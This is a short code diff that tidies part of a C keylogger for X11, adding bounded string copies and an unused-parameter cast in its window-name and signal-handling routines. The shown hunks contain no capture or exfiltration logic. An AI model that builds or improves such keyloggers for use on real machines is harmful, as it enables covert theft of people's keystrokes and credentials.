@@ -32,6 +32,7 @@ volatile sig_atomic_t running = 1;
 
 // Manejador de señales para limpieza
 void signal_handler(int signum) {
+    (void)signum; // Parámetro requerido pero no usado
     running = 0;
     printf("\n[!] Deteniendo keylogger...\n");
 }
@@ -42,7 +43,8 @@ char* get_window_name(Display *display, Window window) {
     char *name = NULL;
     
     if (window == None) {
-        strcpy(window_name, "Unknown");
+        strncpy(window_name, "Unknown", MAX_WINDOW_NAME - 1);
+        window_name[MAX_WINDOW_NAME - 1] = '\0';
         return window_name;
     }
     
@@ -51,7 +53,8 @@ char* get_window_name(Display *display, Window window) {
         window_name[MAX_WINDOW_NAME - 1] = '\0';
         XFree(name);
     } else {
-        strcpy(window_name, "Unnamed Window");
+        strncpy(window_name, "Unnamed Window", MAX_WINDOW_NAME - 1);
+        window_name[MAX_WINDOW_NAME - 1] = '\0';
     }
     
     return window_name;
